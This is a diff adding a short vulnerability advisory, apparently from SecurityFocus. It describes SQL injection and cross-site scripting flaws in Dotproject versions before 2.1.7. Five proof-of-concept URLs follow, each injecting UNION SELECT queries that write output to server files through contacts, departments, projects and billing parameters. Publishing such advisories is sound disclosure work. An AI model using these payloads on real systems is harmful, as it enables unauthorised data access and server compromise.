@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/56624/info
+
+Dotproject is prone to the following security vulnerabilities:
+
+1. Multiple SQL-injection vulnerabilities
+
+2. Multiple cross-site scripting vulnerabilities
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Dotproject versions prior to 2.1.7 are vulnerable. 
+
+http://www.example.com/index.php?m=contacts&search_string=0%27%29%20UNION%20SELECT%20version(),2,3,4,5,6,7,8, 9,10,11%20INTO%20OUTFILE%20%27file.txt%27%20--%202
+http://www.example.com/index.php?m=contacts&where=%27%29%20UNION%20SELECT%20version(),2,3,4,5,6,7,8,9,10,11%2 0INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+http://www.example.com/index.php?m=departments&dept_id=%27%20UNION%20SELECT%20version%28%29%20INTO%20OUTFILE% 20%27/tmp/file.txt%27%20--%202
+http://www.example.com/?m=projects&update_project_status=1&project_status=1&project_id[]=%27%20UNION%20SELECT %20version%28%29%20INTO%20OUTFILE%20%27/tmp/file.txt%27%20--%202
+http://www.example.com/?m=system&a=billingcode&company_id=0%20UNION%20SELECT%201,2,3,4,5,6%20INTO%20OUTFILE%2 0%27/tmp/file.txt%27%20--%202
